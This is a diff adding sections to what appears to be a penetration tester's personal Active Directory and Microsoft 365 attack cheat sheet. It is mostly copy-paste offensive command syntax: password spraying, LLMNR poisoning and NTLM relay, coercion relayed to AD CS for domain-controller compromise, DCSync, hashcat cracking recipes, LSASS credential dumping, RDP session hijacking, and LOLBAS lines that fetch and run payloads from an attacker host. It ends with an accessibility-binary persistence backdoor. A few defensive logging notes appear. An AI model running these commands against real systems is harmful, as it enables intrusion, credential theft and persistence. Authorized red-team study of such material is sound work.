@@ -4,7 +4,10 @@ The field reference that sits under OFFENSIVE-METHODOLOGY.md. That doc is the
 high-altitude phase -> MITRE ATT&CK -> tool MAP; this file is the opposite
 altitude: concrete copy-paste command syntax, per service / per port.
 
-Originally my "Home-Directory" notes file. It folds in vim/neovim: each section
+Originally my "Home-Directory" notes file, since expanded with field techniques
+from TrustedSec's "Actionable Purple Teaming" course (Black Hat USA 2023). The
+DEFENSIVE half of that course — the Splunk/Sentinel detections each attack trips
+— lives in the companion ../PURPLE-TEAM.md. It folds in vim/neovim: each section
 is wrapped in marker banners (the modeline at the very bottom wires foldmethod
 so the folds work with no extra config — open with `vim hacktheplanet`, toggle a
 fold with `za`, close all with `zM`, open all with `zR`).
@@ -43,6 +46,36 @@ masscan -p1-65535 <ip_address> --rate 10000 -oL masscan.txt
 
 # Always add the box to /etc/hosts so vhosts/Kerberos resolve:
 echo "<ip_address> <hostname> <domain>" | sudo tee -a /etc/hosts
+////////////////////////////////////////
+
+
+OSINT / external recon & user enumeration
+++++++++++++++++++++++++++++++++++++++++
+# DNS records. TXT often leaks SPF — i.e. who is authorized to send the org's mail.
+dig @<dns-server> <domain> NS
+dig @<dns-server> <domain> MX
+dig @<dns-server> <domain> TXT
+# ProjectDiscovery stack (install/update via pdtm): subfinder -> httpx -> nuclei
+subfinder -d <domain> -silent | httpx -ip -asn -title -tech-detect -server -status-code
+nuclei -u <domain> -t dns
+# Google dorking (exploit-db.com/google-hacking-database):
+#   site:<domain> "internal use only"   site:<domain> filetype:xls   site:<domain> password
+#   site:<domain> inurl:"index of"      site:<domain> login|portal|admin|upload
+# Names/emails -> usernames: hunter.io, dehashed.com, WeakestLink (LinkedIn scrape).
+
+# --- Microsoft 365 / Entra ID (external, unauthenticated) ---
+# Managed vs federated? It changes the whole approach. View the realm XML:
+#   https://login.microsoftonline.com/getuserrealm.srf?login=<user>@<domain>&xml=1
+Invoke-AADIntReconAsOutsider -Domain <domain> | Format-Table   # AADInternals: federation/MDI/domains
+./onedrive_enum.py -U users.txt -d <domain>                    # validate users via OneDrive
+# TeamFiltration: enumerate then spray M365/Teams. Each request authenticates and
+# counts toward lockout — pace it (low & slow) or you lock the tenant out:
+#   --enum --validate-teams --usernames users.txt
+#   --spray --passwords pw.txt --sleep-min 60 --sleep-max 80 --shuffle-users --jitter 150
+####
+# Logging note (defender's lever): M365 E5/G5 retains logs 1yr and adds high-value
+# events (MailItemsAccessed, Send, SearchQueryInitiated*); E3 is 90d and thinner.
+# Detection coverage depends on the license tier — worth knowing on both sides.
 ////////////////////////////////////////
 
 
@@ -264,15 +297,98 @@ nxc smb <ip_address> -u <user> -H <NThash> -x 'whoami'
 ////////////////////////////////////////
 
 
+Poisoning & relay — Responder / ntlmrelayx
+++++++++++++++++++++++++++++++++++++++++
+# Find relay targets first: hosts where SMB signing is NOT required.
+nxc smb <ip_address>/24 --gen-relay-list relaytargets.txt
+# Poison LLMNR/NBT-NS/mDNS and capture NetNTLMv2 to crack offline:
+sudo responder -I <iface>
+# Downgrade to NetNTLMv1 (shuckable straight to an NT hash — see next fold):
+sudo responder -I <iface> --disable-ess --lm
+# RELAY instead of crack: turn Responder's OWN SMB+HTTP servers OFF first
+# (SMB = Off, HTTP = Off in Responder.conf — /etc/responder/ or /usr/share/responder/), then:
+impacket-ntlmrelayx -tf relaytargets.txt -smb2support              # relay in, dump SAM
+impacket-ntlmrelayx -t smb://<ip_address> -smb2support -socks      # -socks keeps the session
+proxychains nxc smb <ip_address>                                   # ride the relayed session
+# A relayed logon is one where the source workstation != the account's own host.
+////////////////////////////////////////
+
+
+Coercion -> relay -> domain compromise
+++++++++++++++++++++++++++++++++++++++++
+# Force a machine (ideally a DC) to authenticate to you, then relay that auth.
+impacket-petitpotam <your-ip> <dc-ip>                       # MS-EFSRPC (EfsRpcOpenFileRaw)
+printerbug.py <domain>/<user>:<password>@<dc-ip> <your-ip>  # MS-RPRN spooler (a.k.a. Dementor)
+coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain>   # many vectors
+# Relay the coerced DC auth to AD CS web enrollment (dirkjanm relay-to-ADCS) -> DC cert:
+impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# Turn that DC cert into the DC's NT hash via PKINIT, then DCSync:
+python3 gettgtpkinit.py -cert-pem dc.crt -key-pem dc.key -dc-ip <dc-ip> <domain>/'DC$' dc.ccache
+KRB5CCNAME=dc.ccache python3 getnthash.py -k <AS-REP-key> -dc-ip <dc-ip> <domain>/'DC$'
+impacket-secretsdump -hashes :<NThash> <domain>/'DC$'@<dc-ip>
+
+# NetNTLMv1 is fatal: a captured v1 response downgrades to the NT hash directly.
+#   crack.sh / shuck.sh (shuck.sh/get-shucking.php) "shuck" NetNTLMv1 -> NT hash.
+#   ref: trustedsec.com/blog/practical-attacks-against-ntlmv1
+nxc smb <ip_address> -u '<host>$' -H <NThash> -d <domain>   # then auth as the machine acct
+////////////////////////////////////////
+
+
+AD CS abuse — certipy (ESC1 shown)
+++++++++++++++++++++++++++++++++++++++++
+certipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc-ip> -vulnerable -stdout
+# ESC1 (template lets the enrollee supply the subject) -> request a cert AS an admin:
+certipy-ad req -u <user>@<domain> -p <password> -ca <CA-name> -target <ca-host> \
+    -template <vuln-template> -upn administrator@<domain>
+certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>       # cert -> TGT + NT hash
+nxc smb <dc-ip> -u administrator -H <NThash> -d <domain>
+////////////////////////////////////////
+
+
+DCSync / NTDS dump (needs DA or replication rights)
+++++++++++++++++++++++++++++++++++++++++
+impacket-secretsdump <domain>/<user>:<password>@<dc-ip> -just-dc              # all domain hashes
+impacket-secretsdump <domain>/<user>:<password>@<dc-ip> -just-dc-user krbtgt  # targeted (quieter)
+nxc smb <dc-ip> -u <user> -p <password> --ntds                               # same, via nxc
+# A targeted single-user DCSync is far quieter than a full -just-dc sweep.
+////////////////////////////////////////
+
+
 Credential cracking — hashcat / john
 ++++++++++++++++++++++++++++++++++++++++
-hashid '<hash>'                      # identify the mode first
-hashcat -m 1000  hashes.txt /usr/share/wordlists/rockyou.txt   # NTLM
-hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt    # AS-REP (krb5asrep)
-hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt    # Kerberoast (TGS)
-hashcat -m 5600  ntlmv2.txt /usr/share/wordlists/rockyou.txt   # NetNTLMv2 (Responder)
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-# Add rules when the wordlist alone misses:  -r /usr/share/hashcat/rules/best64.rule
+# Hashing is ONE-WAY — you crack it, you don't decrypt it. (Encoding like base64 is
+# reversible with no key; encryption needs a key; hashes give up only to guessing.)
+hashid '<hash>'          # or name-that-hash — identify the mode before you burn GPU
+# Modes you actually meet (where they come from):
+#   1000  NTLM (NTDS dump)            3000  LM
+#   5500  NetNTLMv1 (Responder)       5600  NetNTLMv2 (Responder)
+#   13100 Kerberoast (TGS)            18200 AS-REP (krb5asrep)
+#   2100  DCC2 / MSCache2 (cached)    3200  bcrypt
+#   full table: hashcat.net/wiki/doku.php?id=example_hashes
+
+# Attack modes (-O = optimized kernel, big speedup; mind the password-length cap):
+hashcat -m 1000 -O hashes.txt rockyou.txt                                   # -a 0 dictionary
+hashcat -m 13100 -O kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule  # dict + RULES
+hashcat -m 1000 -O hashes.txt -a 3 ?u?l?l?l?l?l?d?d                         # -a 3 mask / brute
+hashcat -m 5500 -O hashes.txt -a 6 wordlist.txt ?d?d?d?d                    # -a 6 hybrid word+mask
+# Rules mutate the wordlist (apple -> @ppl3 / apple123 / app); stack them for more reach:
+#   best64.rule (fast)   OneRuleToRuleThemAll   NSAKEY/nsa-rules   nyxgeek-rules
+
+# Build TARGETED wordlists — beats raw rockyou on corporate passwords:
+exrex "(Winter|Spring|Summer|Fall|Autumn)20(1[7-9]|2[0-5])" > seasons.txt    # Season+Year
+cupp -i                                                                       # OSINT-driven (names/dates/pets)
+kwp basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route > kwalks.txt
+# PACK: profile a REAL dump's masks, then crack within this org's actual policy:
+statsgen ntds.txt -o org.masks && maskgen org.masks --optindex -o org.hcmask
+hashcat -m 1000 -O ntds.txt -a 3 org.hcmask
+# hate_crack chains dict -> rules -> mask automatically over a hash file.
+
+# Capture hygiene: dedupe Responder hashes to one per user before cracking:
+sort -u -t: -k1,1 responder.hashes > unique.hashes
+# Kerberoast triage — which cracked SPN users are actually privileged?
+cut -d'$' -f4 spns.txt | cut -d'*' -f2 > spn_users.txt
+grep -wi -f spn_users.txt group-membership.txt | grep -i 'admin\|vpn\|server'
+# Best real-world list: ICANN zone files (CZDS) -> domain labels. Enormous, but gold.
 ////////////////////////////////////////
 
 
@@ -302,6 +418,41 @@ systeminfo                           # patch level -> known exploit
 # PowerUp (PowerShell) for service/registry/path misconfigs:
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<your-ip>/PowerUp.ps1'); Invoke-AllChecks"
 # Unquoted service paths, AlwaysInstallElevated, stored creds (cmdkey /list).
+////////////////////////////////////////
+
+
+Lateral movement & remote execution
+++++++++++++++++++++++++++++++++++++++++
+nxc smb <ip_address> -u <user> -p <password> -x 'whoami'      # cmd  (-X = powershell)
+nxc smb <ip_address> -u <user> -H <NThash> -M lsassy          # remote LSASS -> creds in memory
+nxc smb <ip_address> -u <user> -p <password> --lsa            # LSA secrets
+impacket-psexec <domain>/<user>@<ip_address> -hashes :<NThash>
+evil-winrm -i <ip_address> -u <user> -H <NThash>
+# Find where a Domain Admin is logged on, then hijack their RDP session as SYSTEM:
+nxc smb <ip_address>/24 -u <user> -p <password> -x quser
+sc create hijack binpath= "cmd /k tscon <session-id> /dest:rdp-tcp#<n>" && net start hijack
+####
+# OPSEC: prefer in-memory. `execute-assembly` and BOFs (e.g. situational-awareness
+# sa-netlocalgroup) run .NET without spawning a child process — so no 4688 process-
+# creation event is written. "Check without writing a 4688."
+////////////////////////////////////////
+
+
+LOLBAS — living-off-the-land Windows binaries
+++++++++++++++++++++++++++++++++++++++++
+# Signed Microsoft binaries that download/execute for you (lolbas-project.github.io).
+# Each still writes a 4688 — that's exactly what the blue side hunts (see PURPLE-TEAM.md).
+regsvr32 /s /n /u /i:http://<your-ip>/file.sct scrobj.dll
+mshta http://<your-ip>/payload.hta
+rundll32.exe shell32.dll,ShellExec_RunDLL "cmd.exe"
+msbuild.exe \\<your-ip>\share\payload.xml
+wmic process call create "calc.exe"
+msiexec /q /i http://<your-ip>/evil.msi
+installutil /logfile= /logtoconsole=false /u payload.dll
+# Persistence (AUTHORIZED tests only) — IFEO "debugger" on an accessibility binary
+# gives a SYSTEM shell from the lock screen when On-Screen Keyboard is triggered:
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" \
+    /v Debugger /t REG_SZ /d "cmd.exe"
 ////////////////////////////////////////
 
 
